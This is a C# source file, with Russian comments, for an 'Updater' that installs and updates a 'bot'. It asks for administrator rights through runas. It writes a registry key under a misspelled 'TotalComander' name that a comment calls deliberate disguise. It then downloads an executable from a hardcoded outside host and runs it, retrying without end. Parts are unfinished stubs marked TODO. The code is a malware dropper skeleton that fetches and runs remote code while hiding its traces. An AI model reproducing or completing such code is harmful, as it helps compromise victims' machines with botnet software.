using System;
using System.Collections.Generic;

using System.Text;

using System.IO;
using System.Net;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Principal;
using System.Windows.Forms;

namespace Updater
{
    class Program
    {
        const string NAME = "bot.exe"; //имя бота
        const string URL_CHECK_UPDATE = "setver.net/update.exe"; 

        static void Main(string[] args)
        {
            WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);

            if (hasAdministrativeRight == false)
            {
                ProcessStartInfo processInfo = new ProcessStartInfo(); //создаем новый процесс
                processInfo.Verb = "runas"; //в данном случае указываем, что процесс должен быть запущен с правами администратора
                processInfo.FileName = Application.ExecutablePath;
                try
                {
                    Process.Start(processInfo); //пытаемся запустить процесс
                }
                catch (Exception e)
                { }
                Application.Exit();
            }
            else //имеем права администратора, значит, продолжаем
            {
                string pathToFile = Application.ExecutablePath + NAME;

                if (File.Exists(pathToFile)) //проверяем, установлен ли уже бот
                {
                    //обновляем бота
                    string url = CheckUpdate();
                    if (!string.IsNullOrEmpty(url))
                    {
                        while (!DownloadFile(url, pathToFile));
                    } 
                }
                else //запускаем установку
                {
                    string keyName = "HKEY_LOCAL_MACHINE/SOFTWARE/TotalComander/"; //это не опечатка, это маскировка
                    Registry.SetValue(keyName, "GUID", Guid.NewGuid().ToString());
                    //TODO: дописать код
                }

            }
        }

        private static string CheckUpdate() //TODO: проверка обновлений
        {
            return "";
        }

        private static bool DownloadFile(string url, string path)
        {
            try
            {
                //скачивание и сохранение файла
                WebClient wc = new WebClient();
                Stream stream = wc.OpenRead(url);

                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, (int)stream.Length);

                File.Delete(path);

                FileStream fs = File.Create(path);
                fs.Write(data, 0, data.Length);

                //запуск бота
                if (File.Exists(path))
                    Process.Start(path);
            }
            catch (Exception e)
            {
                return false; //если неудача, возвращаем false
            }
            return true;

        }
    }
}